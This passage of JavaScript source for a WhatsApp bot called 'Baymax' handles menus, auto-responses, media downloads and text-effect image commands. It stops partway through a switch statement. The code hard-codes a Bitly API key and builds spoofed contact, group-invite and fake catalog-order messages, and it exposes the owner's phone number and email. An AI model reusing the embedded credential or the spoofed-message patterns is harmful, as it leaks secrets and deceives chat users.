require("./config");
require("./lib/JSONstringify.d.js");
const {
Browsers,
BufferJSON,
WA_DEFAULT_EPHEMERAL,
generateWAMessageFromContent,
proto,
generateWAMessageContent,
generateWAMessage,
prepareWAMessageMedia,
areJidsSameUser,
getContentType,
downloadContentFromMessage,
getMediaKeys,
generateThumbnail,
extractUrlFromText
} = require("@whiskeysockets/baileys");
const { WAMessageStubType } = require('@adiwajshing/baileys')
const fs = require("fs");
const fetch = require('node-fetch')
const cron = require("node-cron");
const moment = require("moment-timezone");
const ytdl = require("ytdl-core");
const yts = require("yt-search");
const util = require("util");
const request = require("request");
const chalk = require("chalk");
const os = require('os')
const speed = require("performance-now");
const { performance } = require("perf_hooks");
const axios = require("axios");
const cheerio = require("cheerio");
const path = require("path");
const QRCode = require("qrcode");
const { platform } = require("process");
const { exec, spawn, execSync } = require("child_process");
const {
Sticker,
createSticker,
StickerTypes,
} = require("wa-sticker-formatter");
const Jimp = require("jimp");
const stringSimilarity = require("string-similarity");
const Database = require("@replit/database")
const db = new Database()



//lIB FILE
const { Nothing,Failed,Succes,addAutoClear,autoClearChat, checkDataName, createDataId, addDataId, removeDataId, checkDataId, getHit, cmdAdd, expiredCmd } = require("./lib/totalcmd");
const {
getAllCmd,
getBuffer,
getCases,
tanggal,
generateProfilePicture,
sleep,
getSizeMedia,
fetchJson,
runtime,
parseMention,
isUrl,
formatDate,
pickRandom,
monospace,
getGroupAdmins,
getRandom,
generateMessageTag,
} = require("./lib/functional.js");
const { pindl, soundcloud, pinterest } = require("./lib/skrep");
const { jadibot, stopjadibot, listjadibot } = require("./lib/clone");
const diferentme = require("./lib/JSONstringify.js");
const {
gcc,
tzy,
pak,
kel,
doc,
trol,
ngetrol,
ftroli,
ft,
gc,
lok,
aud,
} = require("./lib/fake");




const more = String.fromCharCode(8206);
const readMore = more.repeat(4001);

// DATA DATA
const hitnya = JSON.parse(fs.readFileSync("./data/hit.json"));
const dash = JSON.parse(fs.readFileSync("./data/dash.json"));
const AntiSpam = JSON.parse(fs.readFileSync("./data/antispam.json"));
const bannedlist = JSON.parse(fs.readFileSync("./data/banned.json"));
const firstchat = JSON.parse(fs.readFileSync("./data/fc.json"));
const isBanned = m.sender.includes(bannedlist) ? true : false;






module.exports = satria = async (satria, m, chatUpdate, store) => {
try {
var body =
m.mtype === "conversation"
? m.message.conversation
: m.mtype == "imageMessage"
? m.message.imageMessage.caption
: m.mtype == "videoMessage"
? m.message.videoMessage.caption
: m.mtype == "extendedTextMessage"
? m.message.extendedTextMessage.text
: m.mtype == "buttonsResponseMessage"
? m.message.buttonsResponseMessage.selectedButtonId
: m.mtype == "listResponseMessage"
? m.message.listResponseMessage.singleSelectReply.selectedRowId
: m.mtype == "templateButtonReplyMessage"
? m.message.templateButtonReplyMessage.selectedId
: m.mtype === "messageContextInfo"
? m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.text
: "";
var budy = typeof m.text == "string" ? m.text : "";
var prefix = prefa
? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
: ""
: prefa ?? global.prefix;
global.prefix = prefix;
const isCmd = body.startsWith(".");
global.replyType = pickRandom(["web", "troli", "text"]);
const command = body
.replace(prefix, "")
.trim()
.split(/ +/)
.shift()
.toLowerCase();
var args = body.trim().split(/ +/).slice(1);
args = args.concat(["", "", "", "", "", ""]);
const pushname = m.pushName || "No Name";
const { type, quotedMsg, mentioned, now, fromMe } = m;
const isQuotedMsg = type == "extendedTextMessage";
const isQuotedImage = isQuotedMsg
? content.includes("imageMessage")
? true
: false
: false;
const isImage = type == "imageMessage";
const botNumber = await satria.decodeJid(satria.user.id);
const isCreator =
m.sender == `${global.owner}@s.whatsapp.net` ? true : false;
const itsMe = m.sender == botNumber ? true : false;
const from = m.chat;
const text = (q = args.join(" ").trim());
const fatkuns = m.quoted || m;
const quoted =
fatkuns.mtype == "buttonsMessage"
? fatkuns[Object.keys(fatkuns)[1]]
: fatkuns.mtype == "templateMessage"
? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]]
: fatkuns.mtype == "product"
? fatkuns[Object.keys(fatkuns)[0]]
: m.quoted
? m.quoted
: m;
const mime = (quoted.msg || quoted).mimetype || "";
const qmsg = quoted.msg || quoted;
const isMedia = /image|video|sticker|audio/.test(mime);

const senderNumber = m.sender.split("@")[0]
const { msgFilter, addSpam, SpamExpired, cekSpam} = require('./lib/antispam')
const spammer = []

/* New Line */
const isGroup = m.isGroup
const groupMetadata = m.isGroup
? await satria.groupMetadata(m.chat).catch((e) => {})
: "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : "";
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const color = (text, color) => {
return !color ? chalk.green(text) : chalk.keyword(color)(text);
};
const Tnow = (new Date()/1000).toFixed(0)
const seli = Tnow - m.messageTimestamp.low
if (seli > Intervalmsg) return console.log(new ReferenceError(`Pesan ${Intervalmsg} detik yang lalu diabaikan agar tidak nyepam`))
// Function By SatriaId
function playRandom(folders) {
const musicFiles = fs.readdirSync(folders);
if (musicFiles.length === 0) {
console.log("The folder is empty. No music files found.");
return null;
}
const randomIndex = Math.floor(Math.random() * musicFiles.length);
const randomMusicFile = musicFiles[randomIndex];
const fullPath = path.join(folders, randomMusicFile);
return fullPath;
}
const fkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? { remoteJid: `status@broadcast` } : {}),
},
message: {
contactMessage: {
displayName: pushname,
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:$pushname},\nitem1.TEL;waid=${
m.sender.split("@")[0]
}:${m.sender.split("@")[0]}\nitem1.X-ABLabell:Ponsel\nEND:VCARD`,
jpegThumbnail: global.thumb,
thumbnail: global.thumb,
sendEphemeral: true,
},
},
};
const gc = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? { remoteJid: "@s.whatsapp.net" } : {}),
},
message: {
groupInviteMessage: {
groupJid: "120363025461390219@g.us",
inviteCode: "z0JcSBd3mAhIfSSY",
inviteExpiration: "Powered By ❤️ SatganzDevs",
groupName: "Powered By ❤️ SatganzDevs",
caption: "Powered By ❤️ SatganzDevs",
},
},
};
const onlyPrem = async () => {
return satria.sendMessage(
m.chat,
{
text: `Hallo @${
m.sender.split("@")[0]
}, Mohon maaf, hanya pengguna premium yang dapat mengakses fitur ini melalui obrolan pribadi, atau bergabung ke dalam grup bot untuk menggunakan layanannya.`,
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: true,
title: ``,
body: `Runtime ${runtime(process.uptime())}`,
previewType: "PHOTO",
mediaType: 1,
renderLargerThumbnail: true,
thumbnailUrl: `https://images2.alphacoders.com/124/1242829.jpg`,
sourceUrl: `https://chat.whatsapp.com/G6W25LQb4Ce2i8r4Z0du1q`,
},
},
},
{ quoted: m }
);
}
const reply = async (teks) => {
try {
ppuser = await satria.profilePictureUrl(m.sender, "image");
} catch (err) {
ppuser =
"https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
}
if (global.replyType == "web") {
satria.sendMessage(
m.chat,
{
text: teks,
contextInfo: {
mentionedJid: parseMention(`${teks}`),
externalAdReply: {
showAdAttribution: true,
containsAutoReply: true,
title: `Baymax`,
body: `Runtime ${runtime(process.uptime())}`,
previewType: "PHOTO",
mediaType: 0,
mediaUrl: `https://instagram.com/kurniawan_satriaaaa?igshid=MzNlNGNkZWQ4Mg==`,
sourceType: `https://instagram.com/kurniawan_satriaaaa?igshid=MzNlNGNkZWQ4Mg==`,
sourceId: `https://instagram.com/kurniawan_satriaaaa?igshid=MzNlNGNkZWQ4Mg==`,
thumbnailUrl: ppuser,
sourceUrl: `https://instagram.com/kurniawan_satriaaaa?igshid=MzNlNGNkZWQ4Mg==`,
},
},
},
{ quoted: m }
);
} else if (global.replyType == "troli") {
var troli = generateWAMessageFromContent(
m.chat,
proto.Message.fromObject({
orderMessage: {
orderId: "436664297902534",
sellerJid: "6281268248904@s.whatsapp.net",
itemCount: 9999999,
status: "INQUIRY",
surface: "CATALOG",
message: teks,
orderTitle: "SatganzDevs 2023 | All Rights Reservered",
thumbnail: thumb,
token: "AR6ew8v8oH4gt78Ufm/sMBCeaQJwJlDhOTto8qAZytAdQA==",
},
}),
{ userJid: m.chat, quoted: m }
);
satria.relayMessage(m.chat, troli.message, {
messageId: troli.key.id,
});
}
if (global.replyType == "text") {
satria.sendMessage(
m.chat,
{
text: teks,
contextInfo: { mentionedJid: parseMention(`${teks}`) },
},
{ quoted: m }
);
}
};




cron.schedule(
"00 00 * * *",
() => {
satria.groupSettingUpdate("120363140569875100@g.us", "announcement");
},
{
scheduled: true,
timezone: "Asia/Jakarta",
}
);
cron.schedule(
"00 06 * * *",
() => {
satria.groupSettingUpdate(
"120363140569875100@g.us",
"not_announcement"
);
},
{
scheduled: true,
timezone: "Asia/Jakarta",
}
);

// cron.schedule(
//   "*/1 * * * *",
//   () => {
//     fetchJson("https://thefuckingbot.satganzdevs.repl.co");
//     console.log("menjalankan fetch agar selalu aktif");
//   },
//   {
//     scheduled: true,
//     timezone: "Asia/Jakarta",
//   }
// );

satria.readMessages([m.key]);






// //ANTI DELETE
// if (m.message && m.mtype == "protocolMessage") {
// console.log('Someone Delete Messages!!!!')
// let mess = chatUpdate.messages[0].message.protocolMessage
// let chats = Object.entries(await satria.chats).find(([user, data]) => data.messages && data.messages[mess.key.id])
// if(chats[1] !== undefined){
// let msg = JSON.parse(JSON.stringify(chats[1].messages[mess.key.id]))
// await satria.copyNForward(mess.key.remoteJid, msg).catch(e => console.log(e, msg))
// }
// }





// if (m.message) {
// if (!m.messageStubType || !m.isGroup) return;
// let edtr = `@${m.sender.split`@`[0]}`
// if (m.messageStubType == 21) {
// await this.sendMessage(m.chat, { text: `${edtr} mengubah Subject Grup menjadi :\n*${m.messageStubParameters[0]}*`, mentions: [m.sender] }, { quoted: fkontak })
// } else if (m.messageStubType == 22) {
// await this.sendMessage(m.chat, { text: `${edtr} telah mengubah icon grup.`, mentions: [m.sender] }, { quoted: fkontak })
// } else if (m.messageStubType == 1 || m.messageStubType == 23 || m.messageStubType == 132) {
// await this.sendMessage(m.chat, { text: `${edtr} *mereset* link grup!\n\n`, mentions: [m.sender] }, { quoted: fkontak })
// } else if (m.messageStubType == 24) {
// await this.sendMessage(m.chat, { text: `${edtr} mengubah deskripsi grup.\n\n${m.messageStubParameters[0]}`, mentions: [m.sender] }, { quoted: fkontak })
// } else if (m.messageStubType == 25) {
// await this.sendMessage(m.chat, { text: `${edtr} telah mengatur agar *${m.messageStubParameters[0] == 'on' ? 'hanya admin' : 'semua peserta'}* yang dapat mengedit info grup.`, mentions: [m.sender] }, { quoted: fkontak })
// } else if (m.messageStubType == 26) {
// await this.sendMessage(m.chat, { text: `${edtr} telah *${m.messageStubParameters[0] == 'on' ? 'menutup' : 'membuka'}* grup!\nSekarang ${m.messageStubParameters[0] == 'on' ? 'hanya admin yang' : 'semua peserta'} dapat mengirim pesan.`, mentions: [m.sender] }, { quoted: fkontak })
// } else if (m.messageStubType == 29) {
// await this.sendMessage(m.chat, { text: `${edtr} telah menjadikan @${m.messageStubParameters[0].split`@`[0]} sebagai admin.`, mentions: [`${m.sender}`,`${m.messageStubParameters[0]}`] }, { quoted: fkontak })
// } else if (m.messageStubType == 30) {
// await this.sendMessage(m.chat, { text: `${edtr} telah memberhentikan @${m.messageStubParameters[0].split`@`[0]} dari admin.`, mentions: [`${m.sender}`,`${m.messageStubParameters[0]}`] }, { quoted: fkontak })
// } else if (m.messageStubType == 72) {
// await this.sendMessage(m.chat, { text: `${edtr} mengubah durasi pesan sementara menjadi *@${m.messageStubParameters[0]}*`, mentions: [m.sender] }, { quoted: fkontak })
// } else if (m.messageStubType == 123) {
// await this.sendMessage(m.chat, { text: `${edtr} *menonaktifkan* pesan sementara.`, mentions: [m.sender] }, { quoted: fkontak })
// } else {
// console.log({
// messageStubType: m.messageStubType,
// messageStubParameters: m.messageStubParameters,
// type: WAMessageStubType[m.messageStubType],
// });
// }
// }




if (m.message) {
// if (!m.isGroup ) {
// const ofcgc = await satria.groupMetadata('120363140569875100@g.us')
// let iya = false
// for (let i of ofcgc.participants) {
// if (m.sender.includes(i)) {
// iya = true
// }
// }
// if (iya) {
// let msg = generateWAMessageFromContent(
// m.chat,
// proto.Message.fromObject({
// groupInviteMessage: {
// inviteCode: 'G6W25LQb4Ce2i8r4Z0du1q',
// inviteExpiration: 1693661599,
// groupJid: '120363140569875100@g.us',
// groupName: 'Baymax ROOM',
// jpegThumbnail: await getBuffer(thumb),
// caption: 'Kamu belum bergabung dengan grup resmi bot. Bergabunglah ke dalam grup terlebih dahulu agar bot dapat digunakan dalam percakapan pribadi.'
// },
// }),{ userJid: m.sender })
// satria.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
// }
// }
if (!firstchat.includes(m.sender)) {
await reply(`Hai @${m.sender.split("@")[0]} 👋🏻
Baymax hadir di sini untuk memberikan bantuan seperti sistem otomatis yang Anda sebutkan. Saya adalah sebuah AI (Artificial Intelligence) yang dirancang untuk memberikan dukungan dan informasi dalam berbagai hal melalui berbagai platform, termasuk WhatsApp.
ketik .menu untuk melihat menu
*NOTE*: mohon gunakan . di awal pesan ya`);
firstchat.push(m.sender);
fs.writeFileSync(`./data/fc.json`, JSON.stringify(firstchat));
}
console.log(
chalk.black(chalk.bgWhite("[ PESAN ]")),
chalk.black(chalk.bgGreen(new Date())),
chalk.black(
chalk.bgBlue(
budy.length > 30 ? `${q.substring(0, 30)}...` : budy || m.mtype
)
) +
"\n" +
chalk.magenta("=> Dari"),
chalk.green(pushname),
chalk.yellow(`[ ${m.sender.replace("@s.whatsapp.net", "")} ]`) +
"\n" +
chalk.blueBright("=> Di"),
chalk.green(m.isGroup ? pushname : "Private Chat", m.chat)
);
}






let responlist = [];
try {
responlist = JSON.parse(
fs.readFileSync(`./respon/${botNumber.split("@")[0]}.json`)
);
} catch (err) {
if (err.code === "ENOENT") {
fs.writeFileSync(
`./respon/${botNumber.split("@")[0]}.json`,
"[]"
);
console.log("File responlist tidak ditemukan. File baru telah dibuat.");
} else {
console.error("Gagal membaca file responlist:", err);
}
}
if (m.text && !m.isGroup) {
let men = [];
for (let i of responlist) {
men.push(i.keyword);
if (m.text == i.keyword) return reply(i.response);
}
}

const igdl = (url) => {
return new Promise(async (resolve) => {
try {
let json = await (
await axios.post(
"https://saveig.app/api/ajaxSearch",
require("querystring").stringify({
q: url,
t: "media",
lang: "en",
}),
{
headers: {
"Content-Type":
"application/x-www-form-urlencoded; charset=UTF-8",
"Accept-Encoding": "gzip, deflate, br",
Origin: "https://saveig.app/en",
Referer: "https://saveig.app/en",
"Referrer-Policy": "strict-origin-when-cross-origin",
"User-Agent": "PostmanRuntime/7.31.1",
},
}
)
).data;
let $ = cheerio.load(json.data);
let data = [];
$('div[class="download-items__btn"]').each((i, e) =>
data.push({
type: $(e).find("a").attr("href").match(".jpg")
? "image"
: "video",
url: $(e).find("a").attr("href"),
})
);
if (!data.length)
return resolve({
status: false,
});
resolve({
status: true,
data,
});
} catch (e) {
console.log(e);
return resolve({
status: false,
msg: e.message,
});
}
});
};
const react = async (tol) => {
let rec = {
react: {
text: tol,
key: {
remoteJid: m.chat,
fromMe: false,
key: m.key,
id: m.key.id,
participant: m.sender,
},
},
};
satria.sendMessage(m.chat, rec);
};
function didYouMean(inputWord, wordArray) {
function levenshteinDistance(a, b) {
if (a.length === 0) return b.length;
if (b.length === 0) return a.length;

let matrix = Array(a.length + 1)
.fill(null)
.map(() => Array(b.length + 1).fill(null));

for (let i = 0; i <= a.length; i++) {
matrix[i][0] = i;
}

for (let j = 0; j <= b.length; j++) {
matrix[0][j] = j;
}

for (let i = 1; i <= a.length; i++) {
for (let j = 1; j <= b.length; j++) {
const cost = a[i - 1] === b[j - 1] ? 0 : 1;
matrix[i][j] = Math.min(
matrix[i - 1][j] + 1,
matrix[i][j - 1] + 1,
matrix[i - 1][j - 1] + cost
);
}
}

return matrix[a.length][b.length];
}

if (wordArray.includes(inputWord)) {
return null;
}

let minDistance = Infinity;
let closestWord = "";

for (const word of wordArray) {
const distance = levenshteinDistance(inputWord, word);
if (distance < minDistance) {
minDistance = distance;
closestWord = word;
}
}

const wordLength = Math.max(inputWord.length, closestWord.length);
const similarity = ((wordLength - minDistance) / wordLength) * 100;
return {
correctedWord: closestWord,
similarity: similarity.toFixed(2),
};
}

const toFirstCase = (str) =>{
let first = str.split(" ")              // Memenggal nama menggunakan spasi
.map(nama => 
nama.charAt(0).toUpperCase() + 
nama.slice(1))                 // Ganti huruf besar kata-kata pertama
.join(" ");

return first
}

//Auto Hit 
expiredCmd(hitnya, dash)
const thisHit = `${getHit("run", hitnya)}`  
//add to dashboard  db.data.allcommand.push(toFirstCase(command)) //
//if(!isGroup) //addAutoClear(m, "1h", clearchat)  
if(isCmd){
cmdAdd("run", "1d", hitnya)
}








if (isCmd) {

switch (command) {
case "gitclone":
try{
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return reply( 'link githubnya mana? contoh: https://github.com/satganzdevs/database')
if (!regex.test(q)) return setReply('link salah!')
let [, user, repos] = q.match(regex) || []
let repo = repos.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repos}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
// 'attachment; filename=ilmanhdyt/ShiraoriBOT-Mdv2.5.1-251-g836cccd.zip'
reply(`*Mohon tunggu, sedang mengirim repository..*`)
await satria.sendMessage(from, {
document: { url: url },
mimetype: 'aplication/zip',
title: 'SatganzDevs',
fileName: filename,
caption: 'done.'
},{quoted: m })
} catch (err){
reply(mess.error.link)
}
break
case "owner":
{
await react("😜");
const vcard = `BEGIN:VCARD
VERSION:3.0
N:SatganzDevs
FN:SatganzDevs
ORG:CLAY COMMUNITY;
TEL;TYPE=CELL;TYPE=VOICE;waid=6281316701742:+62 813 1670 1742
EMAIL:satganzdevs@gmail.com
INSTAGRAM:instagram.com/kurniawan_satriaaaa
ADR;TYPE=WORK,PREF:;;Jalan Raya No. 123;Jakarta;DKI Jakarta;12345;Indonesia
END:VCARD`;
const sentMsg = await satria.sendMessage(
from,
{
contacts: { displayName: "SatganzDevs", contacts: [{ vcard }] },
},
{ quoted: m }
)
await satria.sendMessage(
from,
{ audio: fs.readFileSync("./owner.mp3"), mimetype: "audio/mpeg",
ptt: true,
waveform: new Uint8Array(64),
},
{ quoted: sentMsg });
}
break;
case "menu":
{
await react("✅");
let _cmd = await getAllCmd();
let anu = `Hai @${m.sender.split("@")[0]} 👋🏻
Baymax V2 hadir di sini untuk memberikan bantuan seperti sistem otomatis yang Anda sebutkan. Saya adalah sebuah AI (Artificial Intelligence) yang dirancang untuk memberikan dukungan dan informasi dalam berbagai hal melalui berbagai platform, termasuk WhatsApp.

ℹ Informasi tentang Bot:
° *Library* : @whiskeysockets/baileys
° *Version* : 6.4.0
° *Total Hit* : 100
° *Total Fitur* : ${_cmd.length}
° *Hostname* : Replit
° *Tanggal Server* : ${moment.tz("Asia/Jakarta").format("DD/MM/YY")}
° *Waktu Server* : ${moment.tz("Asia/Jakarta").format("HH:mm:ss")}


🚀 ${pickRandom(quotes.motivasi)} ${readMore}${readMore}


┌──⭓ *「 All Menu 」*
│
${_cmd.sort((a, b) => a.localeCompare(b)).map((v, i) => `│${i + 1}. ${v}`).join("\n")}

│
└───────⭓ 
© 𝟸𝟶𝟸𝟹 ᴋᴜʀɴɪᴀᴡᴀɴ sᴀᴛʀɪᴀ. ᴀʟʟ ʀɪɢʜᴛs ʀᴇsᴇʀᴠᴇᴅ.
`;
satria
.sendMessage(
m.chat,
{
image: { url: pickRandom(global.img) },
caption: anu,
contextInfo: {
isForwarded: true,
forwardingScore: 1000,
mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
// externalAdReply: {
//   showAdAttribution: true,
//   title: greetingMessage,
//   description: `Powered By © SatganzDevs`,
//   previewType: "PHOTO",
//   mediaType: 1,
//   renderLargerThumbnail: false,
//   thumbnail: fs.readFileSync("./src/menu.jpg"),
//   sourceUrl: `https://instagram.com/kurniawan_satriaaaa`,
// },
},
},
{ quoted: fkontak }
)
.then(() => {
satria.sendMessage(
from,
{
audio: fs.readFileSync(playRandom("./sound")),
mimetype: "audio/mpeg",
ptt: true,
waveform: new Uint8Array(64),
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: "👋 Hay Kak :> " + pushname,
body: pickRandom(quotes.body),
previewType: "PHOTO",
mediaType: 1,
thumbnail: thumb,
sourceUrl: `https://instagram.com/kurniawan_satriaaaa`,
},
},
},
{ quoted: fkontak }
);
});
}
break;
case "jadibot":
{
await jadibot(satria, m.sender);
}
break;
case "stopjadibot":
{
await stopjadibot(satria, m.sender);
}
break;
case "listjadibot":
{
await listjadibot(satria, m);
}
break;
case "mountainview":
{
satria.sendMessage(
from,
{ image: { url: 'https://api.satganzdevs.cloud/api/wallpaper/pegunungan' }, caption: "🌄" },
{ quoted: fkontak }
);
}
break;
case "meme":
{
satria.sendMessage(
from,
{ image: { url: 'https://api.satganzdevs.cloud/api/random/meme' }, caption: "😁" },
{ quoted: fkontak }
);
}
break;
case "addresponse":
{
if (!text) return reply(`usage example: addresponse hey|hello`);
let keyword = q.split("|")[0];
let response = q.split("|")[1];
if (!response)
return reply(
"please input response, usage example: addresponse hey|hello"
);
responlist.push({
keyword: keyword,
response: response,
});
await fs.writeFileSync(
`./respon/${botNumber.split("@")[0]}.json`,
JSON.stringify(responlist)
);
reply(
`Successfully added response when someone sends the text ${keyword}\nReply with ${response}`
);
}
break;
case "delresponse":
{
if (!text) return reply(`usage example: delresponse hey`);
let position = responlist.findIndex((item) => item.keyword === q);
if (position !== -1) {
responlist.splice(position, 1);
await fs.writeFileSync(
`./respon/${botNumber.split("@")[0]}.json`,
JSON.stringify(responlist)
);
reply(`Successfully deleted response for ${q}`);
} else
return reply(`Response for ${q} does not exist in the database`);
}
break;
case "responselist":
case "listresponse":
{
let responseListMessage = `*── 「 RESPONSE LIST 」 ──*\nTotal: ${responlist.length}\n\n`;
for (let i of responlist) {
responseListMessage += `*KEYWORD:* ${i.keyword}\n*Response:* ${i.response}\n\n`;
}
reply(responseListMessage);
}
break;
case "remini":
{
if (!m.isGroup && !isCreator) return onlyPrem()
await reply("Please Wait...");
const { remini } = diferentme;
if (/image/.test(mime)) {
let media = await satria.downloadMediaMessage(qmsg);
let proses = await remini(media, "enhance");
satria.sendMessage(
m.chat,
{ image: proses, caption: "nih" },
{ quoted: m }
);
}
}
break;
case "tinyurl":{
if (args.length < 1) return reply(`Masukkan link`)
if (!/^(https?|ftp):\/\/[^\s\/$.?#][^\s]*$/.test(q)) return reply(`Masukkan link`)
const fetchText = (url, optiono) => {
return new Promise((resolve, reject) => {
return fetch(url, optiono)
.then(response => response.text())
.then(text => resolve(text))
.catch(err => {
console.log(color(err,'red'))
reject(err)
})
})
}
let okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
let shorti = `*Result : ${okok}*`
reply(shorti)
}
break  
case "bitly":{
const { BitlyClient } = require('bitly');
const bitly = new BitlyClient('7d737131e678fc366699edead8bca146e69f6c78', {});
if(!q) return reply("Masukan link")
if(!isUrl) return reply("Masukan link dengan benar")
try {
let result = await bitly.shorten(q);
reply(`Link: ${result.link}\nCreated at: ${result.created_at}`)
} catch(e) {
reply(`Url invalid`)
}
}
break;
case "candy":
case "christmas":
case "3dchristmas":
case "sparklechristmas":
case "deepsea":
case "scifi":
case "rainbow":
case "waterpipe":
case "spooky":
case "pencil":
case "circuit":
case "discovery":
case "metalic":
case "fiction":
case "demon":
case "transformer":
case "berry":
case "thunder":
case "magma":
case "3dstone":
case "neonlight":
case "glitch":
case "harrypotter":
case "brokenglass":
case "papercut":
case "watercolor":
case "multicolor":
case "neondevil":
case "underwater":
case "graffitibike":
case "snow":
case "cloud":
case "honey":
case "ice":
case "fruitjuice":
case "biscuit":
case "wood":
case "chocolate":
case "strawberry":
case "matrix":
case "blood":
case "dropwater":
case "toxic":
case "lava":
case "rock":
case "bloodglas":
case "hallowen":
case "darkgold":
case "joker":
case "wicker":
case "firework":
case "skeleton":
case "blackpink":
case "sand":
case "glue":
case "1917":
case "leaves":
{
const textpro = require("./lib/textpro");
if (!q) return reply(`Example : ${prefix + command} satria`);
await reply(mess.wait);
let link;
if (/candy/.test(command))
link =
"https://textpro.me/create-christmas-candy-cane-text-effect-1056.html";
if (/christmas/.test(command))
link =
"https://textpro.me/christmas-tree-text-effect-online-free-1057.html";
if (/3dchristmas/.test(command))
link =
"https://textpro.me/3d-christmas-text-effect-by-name-1055.html";
if (/sparklechristmas/.test(command))
link =
"https://textpro.me/sparkles-merry-christmas-text-effect-1054.html";
if (/deepsea/.test(command))
link =
"https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html";
if (/scifi/.test(command))
link =
"https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html";
if (/rainbow/.test(command))
link =
"https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html";
if (/waterpipe/.test(command))
link =
"https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html";
if (/spooky/.test(command))
link =
"https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html";
if (/pencil/.test(command))
link =
"https://textpro.me/create-a-sketch-text-effect-online-1044.html";
if (/circuit/.test(command))
link =
"https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html";
if (/discovery/.test(command))
link =
"https://textpro.me/create-space-text-effects-online-free-1042.html";
if (/metalic/.test(command))
link =
"https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html";
if (/fiction/.test(command))
link =
"https://textpro.me/create-science-fiction-text-effect-online-free-1038.html";
if (/demon/.test(command))
link =
"https://textpro.me/create-green-horror-style-text-effect-online-1036.html";
if (/transformer/.test(command))
link =
"https://textpro.me/create-a-transformer-text-effect-online-1035.html";
if (/berry/.test(command))
link =
"https://textpro.me/create-berry-text-effect-online-free-1033.html";
if (/thunder/.test(command))
link =
"https://textpro.me/online-thunder-text-effect-generator-1031.html";
if (/magma/.test(command))
link =
"https://textpro.me/create-a-magma-hot-text-effect-online-1030.html";
if (/3dstone/.test(command))
link =
"https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html";
if (/neonlight/.test(command))
link =
"https://textpro.me/create-3d-neon-light-text-effect-online-1028.html";
if (/glitch/.test(command))
link =
"https://textpro.me/create-impressive-glitch-text-effects-online-1027.html";
if (/harrypotter/.test(command))
link =
"https://textpro.me/create-harry-potter-text-effect-online-1025.html";
if (/brokenglass/.test(command))
link =
"https://textpro.me/broken-glass-text-effect-free-online-1023.html";
if (/papercut/.test(command))
link =
"https://textpro.me/create-art-paper-cut-text-effect-online-1022.html";
if (/watercolor/.test(command))
link =
"https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html";
if (/multicolor/.test(command))
link =
"https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html";
if (/neondevil/.test(command))
link =
"https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html";
if (/underwater/.test(command))
link =
"https://textpro.me/3d-underwater-text-effect-generator-online-1013.html";
if (/graffitibike/.test(command))
link =
"https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html";
if (/snow/.test(command))
link =
"https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html";
if (/cloud/.test(command))
link =
"https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html";
if (/honey/.test(command))
link = "https://textpro.me/honey-text-effect-868.html";
if (/ice/.test(command))
link = "https://textpro.me/ice-cold-text-effect-862.html";
if (/fruitjuice/.test(command))
link = "https://textpro.me/fruit-juice-text-effect-861.html";
if (/biscuit/.test(command))
link = "https://textpro.me/biscuit-text-effect-858.html";
if (/wood/.test(command))
link = "https://textpro.me/wood-text-effect-856.html";
if (/chocolate/.test(command))
link = "https://textpro.me/chocolate-cake-text-effect-890.html";
if (/strawberry/.test(command))
link =
"https://textpro.me/strawberry-text-effect-online-889.html";
if (/matrix/.test(command))
link =
"https://textpro.me/matrix-style-text-effect-online-884.html";
if (/blood/.test(command))
link =
"https://textpro.me/horror-blood-text-effect-online-883.html";
if (/dropwater/.test(command))
link = "https://textpro.me/dropwater-text-effect-872.html";
if (/toxic/.test(command))
link = "https://textpro.me/toxic-text-effect-online-901.html";
if (/lava/.test(command))
link = "https://textpro.me/lava-text-effect-online-914.html";
if (/rock/.test(command))
link = "https://textpro.me/rock-text-effect-online-915.html";
if (/bloodglas/.test(command))
link =
"https://textpro.me/blood-text-on-the-frosted-glass-941.html";
if (/hallowen/.test(command))
link = "https://textpro.me/halloween-fire-text-effect-940.html";
if (/darkgold/.test(command))
link =
"https://textpro.me/metal-dark-gold-text-effect-online-939.html";
if (/joker/.test(command))
link = "https://textpro.me/create-logo-joker-online-934.html";
if (/wicker/.test(command))
link = "https://textpro.me/wicker-text-effect-online-932.html";
if (/firework/.test(command))
link = "https://textpro.me/firework-sparkle-text-effect-930.html";
if (/skeleton/.test(command))
link = "https://textpro.me/skeleton-text-effect-online-929.html";
if (/blackpink/.test(command))
link =
